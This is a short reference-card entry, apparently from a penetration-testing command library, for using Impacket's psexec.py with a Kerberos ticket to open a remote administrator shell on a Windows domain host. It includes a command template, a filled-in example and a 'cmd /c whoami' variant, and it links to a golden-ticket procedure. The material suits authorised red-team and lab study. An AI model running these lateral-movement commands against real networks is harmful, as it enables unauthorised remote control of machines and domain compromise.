---
type: command
executor: bash
data: ./psexec.py -k -no-pass -dc-ip $_DC_IP $_DOMAIN/$_USERNAME@$_TARGET_IP
output: null
created_at: '2023-04-06T03:56:04.790643+00:00'
updated_at: '2023-04-10T20:26:04.568133+00:00'
platforms:
  - Linux
tags:
  - lateral-movement
  - kerberos
  - psexec
verified: true
validated: true
---

# impacket-psexec-with-kerberos-ticket

## Command

```bash
./psexec.py -k -no-pass -dc-ip $_DC_IP $_DOMAIN/$_USERNAME@$_TARGET_IP
```

## Description

Executes psexec.py using a Kerberos ticket for authentication to gain a remote shell on a target Windows machine via the domain controller.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Use Kerberos authentication | Yes |
| `-no-pass` | No password required (uses ticket) | Yes |
| `-dc-ip` | Domain controller IP | Yes |
| `$_DC_IP` | IP address (e.g., 192.168.1.1) | Yes |
| `$_DOMAIN` | Domain name (e.g., AD) | Yes |
| `$_USERNAME` | Username (e.g., administrator) | Yes |
| `$_TARGET_IP` | Target host IP | Yes |

## Examples

### Basic Usage

```bash
./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100
```

### Advanced Usage

Add target for specific command: `./psexec.py ...@target cmd /c whoami`

## Expected Output

Remote shell prompt, e.g., "C:\Windows\system32> whoami" showing domain\administrator.

## Related

- [[procedures/Forge-and-Use-Golden-Ticket-on-Linux]]
- [[tools/Impacket]]
